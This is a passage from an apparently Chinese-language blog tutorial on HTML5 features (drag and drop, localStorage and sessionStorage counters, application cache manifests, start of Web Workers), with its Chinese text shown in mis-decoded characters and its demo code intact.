punctuation">"</span>allowDrop(event)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>drag1<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Advanced/start_again.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">draggable</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">ondragstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>drag(event)<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span></code></pre><style type="text/css">    #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;}</style><script type="text/javascript">    function allowDrop(ev)    {        ev.preventDefault();    }    function drag(ev)    {        ev.dataTransfer.setData("Text",ev.target.id);    }    function drop(ev)    {        ev.preventDefault();        var data=ev.dataTransfer.getData("Text");        ev.target.appendChild(document.getElementById(data));    }</script><p>è¯·æŠŠå›¾ç‰‡æ‹–æ”¾åˆ°çŸ©å½¢ä¸­ï¼š</p><div id="divmiao1" ondrop="drop(event)" ondragover="allowDrop(event)"></div><br><img id="drag1" src="/2020/02/18/FrontEnd_HTML_Advanced/start_again.jpg" draggable="true" ondragstart="drag(event)"><br><h3 id="draggable"><a href="#draggable" class="headerlink" title="draggable"></a>draggable</h3><p>é¦–å…ˆéœ€è¦æŠŠæƒ³è¦æ‹–åŠ¨çš„å…ƒç´ æ–°å¢ä¸€ä¸ª <code>draggable</code> å±æ€§ï¼Œå³ <code>&lt;img draggable="true"&gt;</code>ã€‚</p><p>ç„¶åï¼Œè§„å®šå½“å…ƒç´ è¢«æ‹–åŠ¨æ—¶å‘ç”Ÿçš„äº‹æƒ…ã€‚</p><h3 id="ondragstart"><a href="#ondragstart" class="headerlink" title="ondragstart"></a>ondragstart</h3><p><code>ondragstart</code> å±æ€§è°ƒç”¨äº†ä¸€ä¸ª <code>drag(event)</code> å‡½æ•°ï¼Œè§„å®šæ‹–åŠ¨ä»€ä¹ˆæ•°æ®ã€‚</p><p>dataTransfer.setData() æ–¹æ³•è®¾ç½®è¢«æ‹–åŠ¨æ•°æ®çš„æ•°æ®ç±»å‹å’Œå€¼ã€‚è¿™é‡Œçš„æ•°æ®ç±»å‹æ˜¯ â€œtextâ€ï¼Œè€Œå€¼æ˜¯è¿™ä¸ªå¯æ‹–åŠ¨å…ƒç´ çš„ id (â€œdrag1â€)ã€‚</p><h3 id="ondragover"><a href="#ondragover" class="headerlink" title="ondragover"></a>ondragover</h3><p><code>ondragover</code> äº‹ä»¶è§„å®šè¢«æ‹–åŠ¨çš„æ•°æ®èƒ½å¤Ÿè¢«æ”¾ç½®åˆ°ä½•å¤„ã€‚</p><p>é»˜è®¤åœ°ï¼Œæ•°æ®/å…ƒç´ æ— æ³•è¢«æ”¾ç½®åˆ°å…¶ä»–å…ƒç´ ä¸­ã€‚ä¸ºäº†å®ç°æ‹–æ”¾ï¼Œæˆ‘ä»¬å¿…é¡»é˜»æ­¢å…ƒç´ çš„è¿™ç§é»˜è®¤çš„å¤„ç†æ–¹å¼ã€‚</p><p>è¿™ä¸ªä»»åŠ¡ç”± ondragover äº‹ä»¶çš„ event.preventDefault() æ–¹æ³•å®Œæˆã€‚</p><h3 id="ondrop"><a href="#ondrop" class="headerlink" title="ondrop"></a>ondrop</h3><p>å½“æ”¾å¼€è¢«æ‹–æ•°æ®æ—¶ï¼Œä¼šå‘ç”Ÿ drop äº‹ä»¶ã€‚</p><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œondrop å±æ€§è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œdrop(event)ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span><span class="token parameter">ev</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>è°ƒç”¨ <code>preventDefault()</code> æ¥é˜»æ­¢æ•°æ®çš„æµè§ˆå™¨é»˜è®¤å¤„ç†æ–¹å¼ï¼ˆdrop äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºæ˜¯ä»¥é“¾æ¥å½¢å¼æ‰“å¼€ï¼‰</li><li>é€šè¿‡ <code>dataTransfer.getData()</code> æ–¹æ³•è·å¾—è¢«æ‹–çš„æ•°æ®ã€‚è¯¥æ–¹æ³•å°†è¿”å›åœ¨ <code>setData()</code> æ–¹æ³•ä¸­è®¾ç½®ä¸ºç›¸åŒç±»å‹çš„ä»»ä½•æ•°æ®</li><li>è¢«æ‹–æ•°æ®æ˜¯è¢«æ‹–å…ƒç´ çš„ id (â€œdrag1â€)</li><li>æŠŠè¢«æ‹–å…ƒç´ è¿½åŠ åˆ°æ”¾ç½®å…ƒç´ ä¸­</li></ul><br><hr><h2 id="æœ¬åœ°å­˜å‚¨"><a href="#æœ¬åœ°å­˜å‚¨" class="headerlink" title="æœ¬åœ°å­˜å‚¨"></a>æœ¬åœ°å­˜å‚¨</h2><p>é€šè¿‡æœ¬åœ°å­˜å‚¨<em>ï¼ˆLocal Storageï¼‰</em>ï¼Œweb åº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­å¯¹æ•°æ®è¿›è¡Œæœ¬åœ°çš„å­˜å‚¨ã€‚</p><p>åœ¨ HTML5 ä¹‹å‰ï¼Œåº”ç”¨ç¨‹åºæ•°æ®åªèƒ½å­˜å‚¨åœ¨ cookie ä¸­ï¼ŒåŒ…æ‹¬æ¯ä¸ªæœåŠ¡å™¨è¯·æ±‚ã€‚</p><p>æœ¬åœ°å­˜å‚¨åˆ™æ›´å®‰å…¨ï¼Œå¹¶ä¸”å¯åœ¨ä¸å½±å“ç½‘ç«™æ€§èƒ½çš„å‰æä¸‹å°†å¤§é‡æ•°æ®å­˜å‚¨äºæœ¬åœ°ã€‚</p><p>ä¸ cookie ä¸åŒï¼Œå­˜å‚¨é™åˆ¶è¦å¤§å¾—å¤šï¼ˆè‡³å°‘5MBï¼‰ï¼Œå¹¶ä¸”ä¿¡æ¯ä¸ä¼šè¢«ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚</p><br><p>HTML æœ¬åœ°å­˜å‚¨æä¾›äº†ä¸¤ä¸ªåœ¨å®¢æˆ·ç«¯å­˜å‚¨æ•°æ®çš„å¯¹è±¡ï¼š</p><ul><li>window.localStorage - <strong>å­˜å‚¨æ²¡æœ‰æˆªæ­¢æ—¥æœŸçš„æ•°æ®</strong>ï¼Œå½“æµè§ˆå™¨è¢«å…³é—­æ—¶æ•°æ®<strong>ä¸ä¼šè¢«åˆ é™¤</strong></li><li>window.sessionStorage - é’ˆå¯¹ä¸€ä¸ª <strong>session</strong> æ¥å­˜å‚¨æ•°æ®ï¼Œå½“å…³é—­æµè§ˆå™¨æ ‡ç­¾é¡µæ—¶<strong>æ•°æ®ä¼šä¸¢å¤±</strong></li></ul><h3 id="localStorage-å¯¹è±¡"><a href="#localStorage-å¯¹è±¡" class="headerlink" title="localStorage å¯¹è±¡"></a>localStorage å¯¹è±¡</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test_result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token comment">// Check browser support</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// å­˜å‚¨ Store</span>    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">,</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å–å› Retrieve</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ..."</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><div id="test_result"></div><script>// Check browser supportif (typeof(Storage) !== "undefined") {    // å­˜å‚¨ Store    localStorage.setItem("website", "https://miaotony.xyz");    // å–å› Retrieve    document.getElementById("test_result").innerHTML = localStorage.getItem("website");} else {    document.getElementById("test_result").innerHTML = "æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...";}</script><br><p>é¦–å…ˆåˆ›å»º localStorage åç§°/å€¼å¯¹ï¼Œå…¶ä¸­ï¼šname=â€websiteâ€ï¼Œvalue=â€<a href="https://miaotony.xyz&quot;/">https://miaotony.xyz"</a></p><p>è€Œåå–å› â€œwebsiteâ€ çš„å€¼ï¼Œå¹¶æŠŠå®ƒæ’åˆ° id=â€test_resultâ€ çš„å…ƒç´ ä¸­ã€‚</p><p>ä¹Ÿå¯ä»¥æŠŠåç§°ä½œä¸ºä¸€ä¸ªå±æ€§æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// å­˜å‚¨</span>localStorage<span class="token punctuation">.</span>website <span class="token operator">=</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">;</span><span class="token comment">// å–å›</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span>website<span class="token punctuation">;</span></code></pre><p><strong>åˆ é™¤</strong>æŸä¸€ localStorage é¡¹ç›®çš„è¯­æ³•ï¼š</p><pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">localStorage.removeItem("website");</code></pre><p>åç§°/å€¼å¯¹<strong>å§‹ç»ˆå­˜å‚¨ä¸ºå­—ç¬¦ä¸²</strong>ã€‚å¦‚æœéœ€è¦è¯·è®°å¾—æŠŠå®ƒä»¬è½¬æ¢ä¸ºå…¶ä»–æ ¼å¼ï¼</p><p>ä¸‹é¢è¿™ä¸ªå¯¹ç”¨æˆ·ç‚¹å‡»æŒ‰é’®çš„æ¬¡æ•°è¿›è¡Œè®¡æ•°ã€‚åœ¨ä»£ç ä¸­ï¼Œå€¼å­—ç¬¦ä¸²è¢«è½¬æ¢ä¸ºæ•°å€¼ï¼Œä¾æ¬¡å¯¹è®¡æ•°è¿›è¡Œé€’å¢ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"æ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® "</span> <span class="token operator">+</span> localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" æ¬¡ã€‚"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clickCounter1()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¯·ç‚¹å‡»è¿™é‡Œï¼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span></code></pre><script>function clickCounter1() {    if(typeof(Storage) !== "undefined") {        if (localStorage.clickcount) {            localStorage.clickcount = Number(localStorage.clickcount)+1;        } else {            localStorage.clickcount = 1;        }        document.getElementById("result2").innerHTML = "æ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® " + localStorage.clickcount + " æ¬¡ã€‚";    } else {        document.getElementById("result2").innerHTML = "æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...";    }}</script><p><button onclick="clickCounter1()" type="button">è¯·ç‚¹å‡»è¿™é‡Œï¼</button></p><br><div id="result2"></div><br><p>ç‚¹å‡»ä¹‹åè®¡æ•°å™¨å°†é€’å¢ï¼Œä¸”å…³é—­è¿™ä¸ªç½‘é¡µ/æµè§ˆå™¨å†æ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œæ•°å­—ä¼šä»ä¸Šä¸€æ¬¡çš„ä½ç½®é€’å¢ï¼Œ<strong>ä¸ä¼šé‡ç½®</strong>ã€‚</p><h3 id="sessionStorage-å¯¹è±¡"><a href="#sessionStorage-å¯¹è±¡" class="headerlink" title="sessionStorage å¯¹è±¡"></a>sessionStorage å¯¹è±¡</h3><p>sessionStorage å¯¹è±¡ç­‰åŒ localStorage å¯¹è±¡ï¼Œä¸åŒä¹‹å¤„åœ¨äº<strong>åªå¯¹ä¸€ä¸ª session å­˜å‚¨æ•°æ®</strong>ã€‚å¦‚æœç”¨æˆ·å…³é—­å…·ä½“çš„æµè§ˆå™¨æ ‡ç­¾é¡µï¼Œ<strong>æ•°æ®ä¹Ÿä¼šè¢«åˆ é™¤</strong>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"åœ¨æœ¬ session ä¸­ï¼Œæ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® "</span> <span class="token operator">+</span> sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" æ¬¡ã€‚"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clickCounter2()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¯·ç‚¹å‡»è¿™é‡Œ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span></code></pre><script>function clickCounter2() {    if(typeof(Storage) !== "undefined") {        if (sessionStorage.clickcount) {            sessionStorage.clickcount = Number(sessionStorage.clickcount)+1;        } else {            sessionStorage.clickcount = 1;        }        document.getElementById("result3").innerHTML = "åœ¨æœ¬ session ä¸­ï¼Œæ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® " + sessionStorage.clickcount + " æ¬¡ã€‚";    } else {        document.getElementById("result3").innerHTML = "æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...";    }}</script><p><button onclick="clickCounter2()" type="button">è¯·ç‚¹å‡»è¿™é‡Œ</button></p><br><div id="result3"></div><br><p>ç‚¹å‡»ä¹‹åè®¡æ•°å™¨ä¹Ÿå°†é€’å¢ï¼Œä½†æ˜¯å…³é—­è¿™ä¸ªç½‘é¡µ/æµè§ˆå™¨å†æ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œæ•°å­—ä¸ä¼šä»ä¸Šä¸€æ¬¡çš„ä½ç½®é€’å¢ï¼Œ<strong>ç›´æ¥é‡ç½®</strong>ã€‚</p><p>å½“ç„¶ï¼Œåˆ·æ–°çš„è¯è¿˜æ˜¯åŒä¸€ä¸ª sessionï¼Œæ‰€ä»¥è¿˜æ˜¯ä¿ç•™çš„ã€‚</p><p>æŒ‰ä¸‹ F12ï¼Œåœ¨<strong>å­˜å‚¨</strong>é‡Œä¹Ÿå¯ä»¥çœ‹å¾—åˆ°<strong>ä¼šè¯å­˜å‚¨</strong>å’Œ<strong>æœ¬åœ°å­˜å‚¨</strong>ã€‚</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/sessionStorage.png" alt="sessionStorage"></p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/localStorage.png" alt="localStorage"></p><br><hr><h2 id="åº”ç”¨ç¨‹åºç¼“å­˜"><a href="#åº”ç”¨ç¨‹åºç¼“å­˜" class="headerlink" title="åº”ç”¨ç¨‹åºç¼“å­˜"></a>åº”ç”¨ç¨‹åºç¼“å­˜</h2><p><strong>ä½¿ç”¨åº”ç”¨ç¨‹åºç¼“å­˜<em>ï¼ˆApplication Cacheï¼‰</em>ï¼Œé€šè¿‡åˆ›å»º cache manifest æ–‡ä»¶ï¼Œå¯è½»æ¾åˆ›å»º web åº”ç”¨çš„ç¦»çº¿ç‰ˆæœ¬ã€‚</strong></p><h3 id="Cache-Manifest-åŸºç¡€"><a href="#Cache-Manifest-åŸºç¡€" class="headerlink" title="Cache Manifest åŸºç¡€"></a>Cache Manifest åŸºç¡€</h3><p>å¦‚éœ€å¯ç”¨åº”ç”¨ç¨‹åºç¼“å­˜ï¼Œéœ€è¦åœ¨æ–‡æ¡£çš„ <code>&lt;html&gt;</code> æ ‡ç­¾ä¸­åŒ…å« <code>manifest</code> å±æ€§ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">manifest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>demo.appcache<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ¯ä¸ªæŒ‡å®šäº† manifest çš„é¡µé¢åœ¨ç”¨æˆ·å¯¹å…¶è®¿é—®æ—¶éƒ½ä¼šè¢«ç¼“å­˜ã€‚å¦‚æœæœªæŒ‡å®š manifest å±æ€§ï¼Œåˆ™é¡µé¢ä¸ä¼šè¢«ç¼“å­˜ï¼ˆé™¤éåœ¨ manifest æ–‡ä»¶ä¸­ç›´æ¥æŒ‡å®šäº†è¯¥é¡µé¢ï¼‰ã€‚</p><p>manifest æ–‡ä»¶çš„å»ºè®®æ–‡ä»¶æ‰©å±•åæ˜¯ï¼šâ€.appcacheâ€ã€‚</p><p>manifest æ–‡ä»¶éœ€è¦è®¾ç½®æ­£ç¡®çš„ MIME-typeï¼Œå³ â€œtext/cache-manifestâ€ã€‚å¿…é¡»åœ¨ web æœåŠ¡å™¨ä¸Šè¿›è¡Œé…ç½®ã€‚</p><h3 id="Manifest-æ–‡ä»¶"><a href="#Manifest-æ–‡ä»¶" class="headerlink" title="Manifest æ–‡ä»¶"></a>Manifest æ–‡ä»¶</h3><p>manifest æ–‡ä»¶æ˜¯ç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨æ¥å‘ŠçŸ¥æµè§ˆå™¨è¢«ç¼“å­˜çš„å†…å®¹ï¼ˆä»¥åŠä¸ç¼“å­˜çš„å†…å®¹ï¼‰ã€‚</p><p>åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>CACHE MANIFEST - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶å°†åœ¨é¦–æ¬¡ä¸‹è½½åè¿›è¡Œç¼“å­˜</li><li>NETWORK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶éœ€è¦ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œä¸”ä¸ä¼šè¢«ç¼“å­˜</li><li>FALLBACK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶è§„å®šå½“é¡µé¢æ— æ³•è®¿é—®æ—¶çš„å›é€€é¡µé¢ï¼ˆæ¯”å¦‚ 404 é¡µé¢ï¼‰</li></ul><p>å®Œæ•´èŒƒä¾‹ï¼š</p><pre class="language-none"><code class="language-none">CACHE MANIFEST# 2020-02-20 v1.0.0/theme.css/logo.gif/main.jsNETWORK:*FALLBACK:/html/ /offline.html</code></pre><p>ç¬¬ä¸€è¡Œï¼Œ<code>CACHE MANIFEST</code>ï¼Œæ˜¯å¿…éœ€çš„ã€‚</p><p><code>NETWORK</code> ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ˜Ÿå·æ¥æŒ‡ç¤ºæ‰€æœ‰å…¶ä»–å…¶ä»–èµ„æº/æ–‡ä»¶éƒ½éœ€è¦è”ç½‘ã€‚</p><p><code>FALLBACK</code> ä¸­ï¼Œè§„å®šå¦‚æœæ— æ³•å»ºç«‹å› ç‰¹ç½‘è¿æ¥ï¼Œåˆ™ç”¨ â€œoffline.htmlâ€ æ›¿ä»£ /html/ ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><p>ä¸€æ—¦åº”ç”¨è¢«ç¼“å­˜ï¼Œå®ƒå°±ä¼šä¿æŒç¼“å­˜ï¼Œæ›´æ–°ç¼“å­˜æœ‰ä»¥ä¸‹è¿™å‡ ç§æƒ…å†µã€‚</p><ul><li>ç”¨æˆ·æ¸…ç©ºæµè§ˆå™¨ç¼“å­˜</li><li>manifest æ–‡ä»¶è¢«ä¿®æ”¹</li><li>ç”±ç¨‹åºæ¥æ›´æ–°åº”ç”¨ç¼“å­˜</li></ul><p>ä»¥ â€œ#â€ å¼€å¤´çš„æ˜¯æ³¨é‡Šè¡Œï¼Œä½†ä¹Ÿå¯æ»¡è¶³å…¶ä»–ç”¨é€”ã€‚åº”ç”¨çš„ç¼“å­˜åªä¼šåœ¨å…¶ manifest æ–‡ä»¶æ”¹å˜æ—¶è¢«æ›´æ–°ã€‚</p><p>æ›´æ–°æ³¨é‡Šè¡Œä¸­çš„æ—¥æœŸå’Œç‰ˆæœ¬å·å°±å¯ä»¥è®©æµè§ˆå™¨é‡æ–°ç¼“å­˜æ–‡ä»¶ã€‚</p><br><hr><h2 id="Web-Workers"><a href="#Web-Workers" class="headerlink" title="Web Workers"></a>Web Workers</h2><p>Web worker æ˜¯è¿è¡Œåœ¨åå°çš„ JavaScriptï¼Œä¸ä¼šå½±å“é¡µé¢çš„æ€§èƒ½ã€‚</p><p>å½“åœ¨ HTML é¡µé¢ä¸­æ‰§è¡Œè„šæœ¬æ—¶ï¼Œåœ¨è„šæœ¬æ‰§è¡Œç»“æŸä¹‹å‰é¡µé¢æ˜¯ä¸å¯å“åº”çš„ã€‚ä½¿ç”¨ Web worker å°±å¯ä»¥ç‹¬ç«‹äºå…¶ä»–è„šæœ¬æ¥åœ¨åå°æ‰§è¡Œï¼Œå‰å°ç…§æ ·å¯ä»¥è¿›è¡Œç‚¹å‡»ã€é€‰å–å†…å®¹ç­‰ç­‰æ“ä½œã€‚</p><p>é€šå¸¸ç”¨äºè€—è´¹ CPU 